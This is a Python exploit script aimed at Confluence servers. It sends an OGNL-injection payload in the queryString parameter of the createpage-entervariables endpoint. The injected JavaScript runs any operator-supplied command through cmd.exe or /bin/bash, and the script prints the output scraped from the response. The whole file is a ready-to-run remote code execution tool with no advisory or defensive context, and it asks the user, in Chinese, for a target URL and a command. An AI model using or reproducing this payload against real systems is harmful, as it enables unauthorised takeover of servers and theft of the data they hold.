# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
import re

class CVE:
    def __init__(self, host, cmd):
        self.url = host + "/pages/createpage-entervariables.action?SpaceKey=x"
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Content-Type": "application/x-www-form-urlencoded"}
        self.data = {
            "queryString": "\\u0027+#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var isWin=java.lang.System.getProperty(\\u0027os.name\\u0027).toLowerCase().contains(\\u0027win\\u0027);var cmd = new java.lang.String(\\u0027"+ cmd +"\\u0027);var p=new java.lang.ProcessBuilder;if(isWin){p.command([\\u0027cmd.exe\\u0027,\\u0027/c\\u0027,cmd]);}else{p.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,cmd]);}p.redirectErrorStream(true);var pc=p.start();org.apache.commons.io.IOUtils.toString(pc.getInputStream())\\u0022)}+\\u0027"}
    def exp(self):
        result = requests.post(self.url, headers=self.headers, data=self.data)
        print(result.url)
        result = BeautifulSoup(result.text, "html.parser").find(attrs={'name': 'queryString'})['value']
        result = re.search(r'"(?<=\{).*?(?=\n)', result)
        print(result)
        #print(.replace('aaaaaaaa[', '').replace('\n]', ''))


host = input("输入URL：")
cmd = input("请输入命令：")
CVE(host, cmd).exp()